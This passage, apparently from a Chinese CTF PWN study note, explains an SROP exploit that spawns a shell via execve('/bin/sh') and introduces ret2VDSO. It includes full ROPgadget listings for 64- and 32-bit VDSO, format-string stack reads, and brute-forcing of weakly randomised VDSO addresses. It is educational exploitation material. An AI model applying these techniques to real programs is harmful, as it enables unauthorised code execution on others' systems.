+<a name="63i6p4fo1n239f8hjrot7bq3h7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read(0,stack_addr,0x400)执行，等待数据，此时我们输入的是execv_frame_payload_all，该数据的组成为main_addr+8字节的0+execve对应的sigframe+0x00（这里的0x00使得其以及之前的数据长度凑够0x150字节）+以0结尾的"/bin/sh"字符串</a>
+</h3>
+<h3 class="topic">
+<a name="7e76u861k1s0b990u0gfmtmocp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里之所以需要加上(0x150 - len(execv_frame_payload))*"\x00"，是为了将之前输入的数据凑够0x150字节，在其之后保存"/bin/sh"字符串，从而满足frame(execve)中execve函数的参数的要求（frame.rdi = stack_addr+0x150 ）</a>
+</h3>
+<h3 class="topic">
+<a name="2dfpd668ckou1sq47k56j8er70">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里要注意，本次数据保存的首地址为之前泄露的stack_addr，所以本次复制进栈的数据不一定与之前的数据相邻，这一点图上可能会产生误导</a>
+</h3>
+<h3 class="topic">
+<a name="3ca2h0ja08uvqq8pnc1v4i0cp2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read函数执行完毕，ret返回，此时rsp指向程序起始位置，函数返回执行</a>
+</h3>
+<h3 class="topic">
+<a name="5lj9kcv06effib71bfmqejj5me">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.send(goto_sigreturn_payload)  &#13;
+ &#13;
+s.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="6cuuc2km43sjtka5gacr72a75n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4fkdnqrsr340nm7lolk53u7v93.png"></p>
+<h3 class="topic">
+<a name="5q3djki64sh0c64au9qeiuf79b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与之前一样，将p64(syscall_addr) + "\x00"*(15 - 8)输入程序中，rax被设置为15，而read程序返回后，执行ret会使得程序去执行syscall，此时程序执行sigreturn系统调用，针对frame(execve),调用函数execve("/bin/sh")获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="1av6db6ok6uueos8en6l12p205">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有个问题，实际执行exp.py时，其输出的debug信息与预想的不同，当接收到泄露的0x400字节的数据之后，程序直接发送了p64(syscall_addr) + "\x00"*(15 - 8)数据，缺少了发送frame(read)等数据的步骤！，这是怎么回事？</a>
+</h3>
+<h3 class="topic">
+<a name="0la138firnd9vc7q3sa95c9mdl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2k8ku80f1c1uiamkkaq9lrid7q.png"></p>
+<h3 class="topic">
+<a name="7ugm586qr1ocqj9celut4brfp0">&nbsp;&nbsp;ret2VDSO</a>
+</h3>
+<h3 class="topic">
+<a name="4hkghd3cren8p6lu9ksccjsl4u">&nbsp;&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a name="0ch2l7jj1aaf8oe0ati77lbjc0">&nbsp;&nbsp;&nbsp;&nbsp;https://xz.aliyun.com/t/5236</a>
+</h3>
+<h3 class="topic">
+<a name="5q9dpbp7s123qs3akuk3iqub8c">&nbsp;&nbsp;&nbsp;&nbsp;http://adam8157.info/blog/2011/10/linux-vdso/</a>
+</h3>
+<h3 class="topic">
+<a name="47ep0s179idgcv5q6gfc4f0pgp">&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/luozhaotian/article/details/79609077</a>
+</h3>
+<h3 class="topic">
+<a href="http://blog.eonew.cn/archives/989" name="0baeg0jipgg3fj461053qtera7">&nbsp;&nbsp;&nbsp;&nbsp;http://blog.eonew.cn/archives/989</a>
+</h3>
+<h3 class="topic">
+<a name="3l1s65adl1i0cfdnn0rarfd3t3">&nbsp;&nbsp;&nbsp;什么是VDSO</a>
+</h3>
+<h3 class="topic">
+<a name="69n6tr7u71lpasgjihnb284d3s">&nbsp;&nbsp;&nbsp;&nbsp;VDSO(Virtual Dynamically-linked Shared Object)</a>
+</h3>
+<h3 class="topic">
+<a name="6mb0a5v14va2gpqo78196i75ir">&nbsp;&nbsp;&nbsp;&nbsp;可以理解为一个虚拟的库（so文件），该库经常被加载到程序的虚拟内存空间中</a>
+</h3>
+<h3 class="topic">
+<a name="7b77el87g8mp7tpiidl46kotr0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3oomnneci0acqimggkem2q0o6m.png"></p>
+<h3 class="topic">
+<a name="7h5p9fkqf6p6805gqcldd3k65b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ldd命令显示程序所需要的动态链接库</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/39aov27t7n6lbcnninc5felifq.png"></p>
+<h3 class="topic">
+<a name="536i8krpac49r24ul79jkicuee">&nbsp;&nbsp;&nbsp;&nbsp;该库是将内核态的调用映射到用户地址空间，这样主要有两个好处</a>
+</h3>
+<h3 class="topic">
+<a name="49q801bu3picj9dcdol7kmmc3p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1，部分经常被使用的系统调用可以通过映射直接被使用，而不需要进行用户态到内核态的切换，从而节省系统开销</a>
+</h3>
+<h3 class="topic">
+<a name="27tb7q52dnqnnifl61ravi17o9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、linux中传统系统调用使用int 0x80进行，不同硬件架构设计了不同的快速系统调用指令，（intel实现了sysenter，sysexit，amd实现了syscall，sysret），为了实现不同硬件平台兼容，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</a>
+</h3>
+<h3 class="topic">
+<a name="6bhq31lg78aaqt1rm3d0g58gvb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</a>
+</h3>
+<h3 class="topic">
+<a name="01a3g5u9aftnv803ges58p9e74">&nbsp;&nbsp;&nbsp;VDSO中有什么（不同版本的内核中vdso会存在差异）</a>
+</h3>
+<h3 class="topic">
+<a name="3jf1sqkn5h6f952s31rn8t8cc6">&nbsp;&nbsp;&nbsp;&nbsp;64位VDSO</a>
+</h3>
+<h3 class="topic">
+<a name="4g08luik6lvmrqhiid5ansvlh2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内置函数</a>
+</h3>
+<h3 class="topic">
+<a name="4msn0svh8nvb157nn7h6fo95hh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/49qm9827jetko16b2s3s5ul3fe.png"></p>
+<h3 class="topic">
+<a name="0sl2984tb1uk1tesmgnalbedam">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用的gadget</a>
+</h3>
+<h3 class="topic">
+<a name="280qtbsfnp7qco2ig192ub1i21">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex@Ex:~/test$ ROPgadget --binary vdso_x64.so&#13;
+Gadgets information&#13;
+============================================================&#13;
+0x00000000000008b8 : adc byte ptr [r11], r8b ; add dh, byte ptr [rsi + 0x58] ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x00000000000008b9 : adc byte ptr [rbx], al ; add dh, byte ptr [rsi + 0x58] ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x000000000000098b : add bl, byte ptr [rbp - 0x3d] ; mov rax, rdx ; pop rbp ; ret&#13;
+0x0000000000000a23 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret&#13;
+0x0000000000000a25 : add byte ptr [rax], al ; pop rbp ; ret&#13;
+0x00000000000008be : add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x00000000000008bb : add dh, byte ptr [rsi + 0x58] ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x0000000000000a18 : add eax, 0xffffc66b ; pop rbp ; ret&#13;
+0x00000000000008ba : add eax, dword ptr [rdx] ; jbe 0x91d ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x0000000000000c23 : add edx, eax ; jmp 0xbb4&#13;
+0x0000000000000c22 : add r10, rax ; jmp 0xbb5&#13;
+0x0000000000000d78 : and al, 0xf6 ; ret&#13;
+0x0000000000000f52 : call 0x3106986a&#13;
+0x0000000000000b26 : call 0xffffffffc9ff487c&#13;
+0x0000000000000aab : clc ; ret&#13;
+0x0000000000000d84 : cld ; ret 0xffff&#13;
+0x0000000000000a16 : cmovae eax, dword ptr [rip - 0x3995] ; pop rbp ; ret&#13;
+0x0000000000000a15 : cmovae rax, qword ptr [rip - 0x3995] ; pop rbp ; ret&#13;
+0x0000000000000988 : cmp edx, eax ; ja 0x993 ; pop rbp ; ret&#13;
+0x0000000000000987 : cmp rdx, rax ; ja 0x994 ; pop rbp ; ret&#13;
+0x0000000000000986 : dec dword ptr [rax + 0x39] ; ret 0x277&#13;
+0x0000000000000c1d : dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x149&#13;
+0x0000000000000ec5 : dec dword ptr [rcx + 0x16158b16] ; ret 0xffff&#13;
+0x0000000000000c1f : imul eax, edx ; add r10, rax ; jmp 0xbb8&#13;
+0x0000000000000c1e : imul rax, rdx ; add r10, rax ; jmp 0xbb9&#13;
+0x000000000000098a : ja 0x991 ; pop rbp ; ret&#13;
+0x00000000000008bc : jbe 0x91b ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x0000000000000f1e : je 0xf29 ; mov qword ptr [rdi], rax ; pop rbp ; ret&#13;
+0x0000000000000fdf : jmp qword ptr [rdi]&#13;
+0x0000000000000aa9 : lea esp, dword ptr [rdx - 8] ; ret&#13;
+0x0000000000000aa8 : lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x0000000000000a21 : mov dword ptr [rdi], 0 ; pop rbp ; ret&#13;
+0x0000000000000f21 : mov dword ptr [rdi], eax ; pop rbp ; ret&#13;
+0x0000000000000f54 : mov dword ptr [rsi], eax ; xor eax, eax ; pop rbp ; ret&#13;
+0x000000000000098f : mov eax, edx ; pop rbp ; ret&#13;
+0x0000000000000f1c : mov ebp, esp ; je 0xf2b ; mov qword ptr [rdi], rax ; pop rbp ; ret&#13;
+0x0000000000000f20 : mov qword ptr [rdi], rax ; pop rbp ; ret&#13;
+0x000000000000098e : mov rax, rdx ; pop rbp ; ret&#13;
+0x0000000000000f1b : mov rbp, rsp ; je 0xf2c ; mov qword ptr [rdi], rax ; pop rbp ; ret&#13;
+0x0000000000000aa3 : pop r13 ; pop r14 ; pop rbp ; lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x0000000000000aa5 : pop r14 ; pop rbp ; lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x00000000000008bd : pop rax ; add cl, byte ptr [rsi + 0xa] ; ret&#13;
+0x0000000000000aa7 : pop rbp ; lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x0000000000000aa4 : pop rbp ; pop r14 ; pop rbp ; lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x000000000000098c : pop rbp ; ret&#13;
+0x0000000000000aa6 : pop rsi ; pop rbp ; lea rsp, qword ptr [r10 - 8] ; ret&#13;
+0x0000000000000f3f : push qword ptr [rdx + rcx - 0x77] ; ret 0xe281&#13;
+0x00000000000008c1 : ret&#13;
+0x0000000000000c21 : ret 0x149&#13;
+0x0000000000000989 : ret 0x277&#13;
+0x0000000000000b3c : ret 0x4801&#13;
+0x0000000000000e64 : ret 0x53e9&#13;
+0x0000000000000c24 : ret 0x8ceb&#13;
+0x0000000000000c4e : ret 0xc2e9&#13;
+0x0000000000000f43 : ret 0xe281&#13;
+0x0000000000000d85 : ret 0xffff&#13;
+0x0000000000000a20 : rol bh, 7 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret&#13;
+0x000000000000090f : ror dword ptr [rdx], 1 ; ret&#13;
+0x0000000000000c20 : scasd eax, dword ptr [rdi] ; ret 0x149&#13;
+0x0000000000000f51 : shr eax, 0xc ; mov dword ptr [rsi], eax ; xor eax, eax ; pop rbp ; ret&#13;
+0x0000000000000a1f : xor eax, eax ; mov dword ptr [rdi], 0 ; pop rbp ; ret&#13;
+0x0000000000000f56 : xor eax, eax ; pop rbp ; ret&#13;
+&#13;
+Unique gadgets found: 62&#13;
+ex@Ex:~/test$</a>
+</h3>
+<h3 class="topic">
+<a name="31i0gf5kc76m7j2m17s5k6l8c5">&nbsp;&nbsp;&nbsp;&nbsp;32位VDSO</a>
+</h3>
+<h3 class="topic">
+<a name="6roj7q4e9us6t5r2iao1lthksf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内置函数</a>
+</h3>
+<h3 class="topic">
+<a name="4n92eajlh7qognru1pgtqoglhv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;存在_kernel_rt_sigreturn函数可以用于执行SROP</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4ejj547cudqsoc6hma26bakd4s.png"></p>
+<h3 class="topic">
+<a name="1e0o05lsh11c378sj31v69vku0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用的gadget</a>
+</h3>
+<h3 class="topic">
+<a name="13jcifjlt89s4rs63nmj2mfel6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex@Ex:~/test$ ROPgadget --binary vdso_x86.so&#13;
+Gadgets information&#13;
+============================================================&#13;
+0x00000817 : adc al, 0x31 ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret&#13;
+0x000007e4 : adc al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000619 : adc byte ptr [ebp + 0xec54704], al ; or al, 0x41 ; ret 0x80e&#13;
+0x00001039 : add al, 0x24 ; ret&#13;
+0x0000061b : add al, 0x47 ; lds ecx, ptr [esi] ; or al, 0x41 ; ret 0x80e&#13;
+0x0000107f : add byte ptr [eax + 0xad], bh ; int 0x80&#13;
+0x0000107d : add byte ptr [eax], al ; add byte ptr [eax + 0xad], bh ; int 0x80&#13;
+0x0000107c : add byte ptr [eax], al ; add byte ptr [eax], al ; mov eax, 0xad ; int 0x80&#13;
+0x00000e3f : add byte ptr [eax], al ; add esp, 0x5c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001074 : add byte ptr [eax], al ; int 0x80&#13;
+0x0000107e : add byte ptr [eax], al ; mov eax, 0xad ; int 0x80&#13;
+0x00000e40 : add byte ptr [ebx + 0x5e5b5cc4], al ; pop edi ; pop ebp ; ret&#13;
+0x000010ab : add byte ptr [ebx], al ; add eax, dword ptr [ebx] ; ret&#13;
+0x00001032 : add cl, byte ptr [ecx - 0x3ca2a4f6] ; mov eax, dword ptr [esp] ; ret&#13;
+0x000010ad : add eax, dword ptr [ebx] ; ret&#13;
+0x000007e2 : add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000815 : add esp, 0x14 ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000e41 : add esp, 0x5c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000967 : add esp, 0x6c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x0000087c : add esp, 0x6c ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x0000103e : and al, 0xc3 ; mov ebx, dword ptr [esp] ; ret&#13;
+0x0000103a : and al, 0xc3 ; mov ecx, dword ptr [esp] ; ret&#13;
+0x00001042 : and al, 0xc3 ; mov edi, dword ptr [esp] ; ret&#13;
+0x00000801 : and byte ptr [edi], cl ; inc ebp ; ret 0x450f&#13;
+0x0000073c : call 0x1046&#13;
+0x00001141 : call 0x340ff6d2&#13;
+0x000007d5 : call dword ptr [ecx]&#13;
+0x000007f0 : cli ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001045 : cmp al, 0x24 ; ret&#13;
+0x0000071f : cmp esi, eax ; ja 0x71e ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x000007cf : dec dword ptr [ebx - 0x32c37d] ; call dword ptr [ecx]&#13;
+0x00001030 : enter 0x274, -0x77 ; or bl, byte ptr [ebx + 0x5d] ; ret&#13;
+0x00000974 : fmul qword ptr [ebx - 0x32cb61] ; push esi ; ret&#13;
+0x00000722 : hlt ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001143 : in eax, 0xf ; xor al, 0x89 ; int 0xf&#13;
+0x00001054 : in eax, 0xf ; xor al, 0xcd ; sbb byte ptr [ebp + 0x5a], 0x59 ; ret&#13;
+0x00000973 : inc ebp ; fmul qword ptr [ebx - 0x32cb61] ; push esi ; ret&#13;
+0x00000803 : inc ebp ; ret 0x450f&#13;
+0x00000620 : inc ecx ; ret 0x80e&#13;
+0x0000061c : inc edi ; lds ecx, ptr [esi] ; or al, 0x41 ; ret 0x80e&#13;
+0x00000969 : insb byte ptr es:[edi], dx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x0000087e : insb byte ptr es:[edi], dx ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001057 : int 0x80&#13;
+0x00001147 : int 0xf&#13;
+0x00001072 : ja 0x1078 ; add byte ptr [eax], al ; int 0x80&#13;
+0x00000721 : ja 0x71c ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x000007e0 : jb 0x7f3 ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000715 : jbe 0x728 ; mov eax, esi ; mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001031 : je 0x103b ; mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret&#13;
+0x0000061d : lds ecx, ptr [esi] ; or al, 0x41 ; ret 0x80e&#13;
+0x00000968 : les ebp, ptr [ebx + ebx*2 + 0x5e] ; pop edi ; pop ebp ; ret&#13;
+0x0000087d : les ebp, ptr [ecx + esi - 0x40] ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000e42 : les ebx, ptr [ebx + ebx*2 + 0x5e] ; pop edi ; pop ebp ; ret&#13;
+0x000007e3 : les edx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000816 : les edx, ptr [ecx + esi] ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret&#13;
+0x0000113f : lfence ; mov ebp, esp ; sysenter&#13;
+0x0000113c : mfence ; lfence ; mov ebp, esp ; sysenter&#13;
+0x00001033 : mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret&#13;
+0x00001071 : mov eax, 0x77 ; int 0x80&#13;
+0x00001080 : mov eax, 0xad ; int 0x80&#13;
+0x00001038 : mov eax, dword ptr [esp] ; ret&#13;
+0x0000102f : mov eax, ecx ; je 0x103d ; mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret&#13;
+0x00000717 : mov eax, esi ; mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x000007ed : mov eax, esi ; mov edx, edi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00001053 : mov ebp, esp ; sysenter&#13;
+0x00001040 : mov ebx, dword ptr [esp] ; ret&#13;
+0x00000965 : mov ebx, edx ; add esp, 0x6c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x0000103c : mov ecx, dword ptr [esp] ; ret&#13;
+0x00001044 : mov edi, dword ptr [esp] ; ret&#13;
+0x00000719 : mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x000007ef : mov edx, edi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000792 : movsd dword ptr es:[edi], dword ptr [esi] ; ret 0xf631&#13;
+0x0000104c : nop ; nop ; nop ; nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000106d : nop ; nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80&#13;
+0x0000104d : nop ; nop ; nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000106e : nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80&#13;
+0x0000104e : nop ; nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000106f : nop ; pop eax ; mov eax, 0x77 ; int 0x80&#13;
+0x0000104f : nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000103d : or al, 0x24 ; ret&#13;
+0x0000061f : or al, 0x41 ; ret 0x80e&#13;
+0x00001034 : or bl, byte ptr [ebx + 0x5d] ; ret&#13;
+0x000007e1 : or byte ptr [ebx + 0x5e5b14c4], al ; pop edi ; pop ebp ; ret&#13;
+0x00000716 : or byte ptr [ecx + 0x5eca89f0], cl ; pop edi ; pop ebp ; ret&#13;
+0x00001070 : pop eax ; mov eax, 0x77 ; int 0x80&#13;
+0x00001059 : pop ebp ; pop edx ; pop ecx ; ret&#13;
+0x0000071d : pop ebp ; ret&#13;
+0x00001035 : pop ebx ; pop ebp ; ret&#13;
+0x000007e5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x0000105b : pop ecx ; ret&#13;
+0x0000071c : pop edi ; pop ebp ; ret&#13;
+0x0000105a : pop edx ; pop ecx ; ret&#13;
+0x0000071b : pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000e43 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+0x00000618 : push cs ; adc byte ptr [ebp + 0xec54704], al ; or al, 0x41 ; ret 0x80e&#13;
+0x0000061e : push cs ; or al, 0x41 ; ret 0x80e&#13;
+0x00001052 : push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000073b : push ebx ; call 0x1047&#13;
+0x00001050 : push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x00000739 : push edi ; push esi ; push ebx ; call 0x1049&#13;
+0x00001051 : push edx ; push ebp ; mov ebp, esp ; sysenter&#13;
+0x0000073a : push esi ; push ebx ; call 0x1048&#13;
+0x000008c2 : push esi ; ret&#13;
+0x00000819 : rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret&#13;
+0x0000071e : ret&#13;
+0x00000804 : ret 0x450f&#13;
+0x000007b4 : ret 0x458b&#13;
+0x00000b77 : ret 0x5d8b&#13;
+0x00000ecf : ret 0x7d8b&#13;
+0x00000621 : ret 0x80e&#13;
+0x00000793 : ret 0xf631&#13;
+0x000008c8 : ret 2&#13;
+0x00000966 : rol dword ptr [ebx + 0x5e5b6cc4], cl ; pop edi ; pop ebp ; ret&#13;
+0x0000102e : ror byte ptr [ecx - 0x76fd8b38], cl ; or bl, byte ptr [ebx + 0x5d] ; ret&#13;
+0x00001041 : sbb al, 0x24 ; ret&#13;
+0x00001058 : sbb byte ptr [ebp + 0x5a], 0x59 ; ret&#13;
+0x00001140 : scasb al, byte ptr es:[edi] ; call 0x340ff6d3&#13;
+0x00000926 : shl dword ptr [eax], 0xf ; inc ebp ; ret 0x450f&#13;
+0x00001055 : sysenter&#13;
+0x0000061a : test dword ptr [edi + eax*2], eax ; lds ecx, ptr [esi] ; or al, 0x41 ; ret 0x80e&#13;
+0x00001145 : xor al, 0x89 ; int 0xf&#13;
+0x00001056 : xor al, 0xcd ; sbb byte ptr [ebp + 0x5a], 0x59 ; ret&#13;
+0x00000818 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#13;
+&#13;
+Unique gadgets found: 123</a>
+</h3>
+<h3 class="topic">
+<a name="0lvrp0p6am8n46bpm1blos6g80">&nbsp;&nbsp;&nbsp;VDSO的存放</a>
+</h3>
+<h3 class="topic">
+<a name="3e67t62lhjl05c0r0bo8a0rm6r">&nbsp;&nbsp;&nbsp;&nbsp;VDSO作为so库被加载到程序进程中，其加载基址随机化程度较弱，存在一定几率可以命中，这一点可以利用</a>
+</h3>
+<h3 class="topic">
+<a name="0ik2pe99ikem8k1o1k7cg1ja8f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7v54jmbijmho762q3iatk13q5s.png"></p>
+<h3 class="topic">
+<a name="49mb9l7ptes3apg6ppge2bg5hr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4tk0kpj9q89g6tgpo127cti980.png"></p>
+<h3 class="topic">
+<a name="6fekt6fcf5qlls1d6pna4n9asj">&nbsp;&nbsp;&nbsp;&nbsp;通过脚本输出VDSO在内存中可能的基址</a>
+</h3>
+<h3 class="topic">
+<a name="7ibo82i1rjrom29m0jv6oqmen3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过一个一个可执行文件和一个脚本，确定VDSO的基地址</a>
+</h3>
+<h3 class="topic">
+<a name="2l8k0ukoe91l7908l313tu9fev">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该可执行文件中print使用$输出栈中的数据  %124$p表示以十六进制形式输出printf函数第124个参数的值，即输出栈中指定位置的数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/561pjnn9e90pnrl4m8hg4cn9pp.png"></p>
+<h3 class="topic">
+<a name="3r73b8caoosrb85fktqn03v3cp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行效果为输出一个数据，但具体是如何输出的呢？</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/304mrch6fhd2dr8n8v9n1mna0c.png"></p>
+<h3 class="topic">
+<a name="1h09a0c6lf5givhtnso3fosve1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$  号是用来指定参数的。&#13;
+读取栈上某地址的话大概格式是：%参数顺序$类型，譬如  %7$lx  就是以  lx  格式读第  7  个参数的值。&#13;
+如果做写入的话一般格式是：  %数值c%参数顺序$类型，譬如说  %40c%5$hhn  就是向第  5  个参数写入  44  这个数值。 </a>
+</h3>
+<h3 class="topic">
+<a name="5tale6e6itmkoaos158p8q13s6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过尝试，该程序在不同的机器上不能正确输出VDSO的基址，但是发现栈中的确保存着VDSO的基地址，所以推测不同机器上对于参数%124$p的要求不同，可能不是124</a>
+</h3>
+<h3 class="topic">
+<a name="4nk2nmu6bpgpacrkr41ljqei67">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/226iibv7s8rfc3jkglasd3c2po.png"></p>
+<h3 class="topic">
+<a name="679nhiojerjm5mbutjp4dcijob">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中os.popen("./vdso_addr")相当于执行指令./vdso_addr，即执行可执行程序，该函数返回一个文件描述符fd，之后的read[:-1]是指将可执行程序输出的数据全部截取，然后拼接到结果result上，然后result会被排序，然后逐个输出</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/07th005k4isnr82ciup8avd0b2.png"></p>
+<h3 class="topic">
+<a name="1uuu0bt6l015167qq8j35f47vr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终输出结果为</a>
+</h3>
+<h3 class="topic">
+<a name="4gk808sur3fa2rjf6d2uc5ec3t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于新内核可以确定vdso基地址在0xf7ed0000-0xf7fd0000之间</a>
+</h3>
+<h3 class="topic">
+<a name="4dm8jbvg9p8fr9ae9809fj7d9q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex@Ex:~/test$ python vdso_addr.py &#13;
+vdso addr: 0xf7ed6000&#13;
+vdso addr: 0xf7ed8000&#13;
+vdso addr: 0xf7eda000&#13;
+vdso addr: 0xf7edd000&#13;
+vdso addr: 0xf7ee6000&#13;
+vdso addr: 0xf7ee6000&#13;
+vdso addr: 0xf7ee9000&#13;
+vdso addr: 0xf7ee9000&#13;
+vdso addr: 0xf7eee000&#13;
+vdso addr: 0xf7eef000&#13;
+vdso addr: 0xf7ef3000&#13;
+vdso addr: 0xf7ef7000&#13;
+vdso addr: 0xf7ef9000&#13;
+vdso addr: 0xf7efa000&#13;
+vdso addr: 0xf7efa000&#13;
+vdso addr: 0xf7efb000&#13;
+vdso addr: 0xf7efd000&#13;
+vdso addr: 0xf7efe000&#13;
+vdso addr: 0xf7f0e000&#13;
+vdso addr: 0xf7f14000&#13;
+vdso addr: 0xf7f1f000&#13;
+vdso addr: 0xf7f21000&#13;
+vdso addr: 0xf7f24000&#13;
+vdso addr: 0xf7f25000&#13;
+vdso addr: 0xf7f26000&#13;
+vdso addr: 0xf7f2a000&#13;
+vdso addr: 0xf7f2a000&#13;
+vdso addr: 0xf7f2b000&#13;
